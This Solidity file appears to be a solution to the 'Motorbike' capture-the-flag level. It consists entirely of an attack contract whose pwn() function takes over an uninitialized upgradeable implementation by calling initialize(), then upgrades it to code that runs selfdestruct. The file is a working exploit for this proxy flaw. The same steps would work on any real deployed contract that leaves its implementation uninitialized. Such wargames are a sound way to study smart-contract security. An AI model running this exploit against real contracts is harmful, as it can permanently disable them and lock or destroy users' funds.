// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// import "forge-std/console.sol";

error CallNotSuccess();

interface ITarget {
    function upgrader() external view returns (address);

    function horsePower() external view returns (address);

    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external
        payable;
}

contract Motorbike {
    function pwn(address targetAddress) public {
        ITarget target = ITarget(targetAddress);
        target.initialize();
        bytes memory data = abi.encodeWithSignature("destroy()");
        target.upgradeToAndCall(address(this), data);
    }

    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}
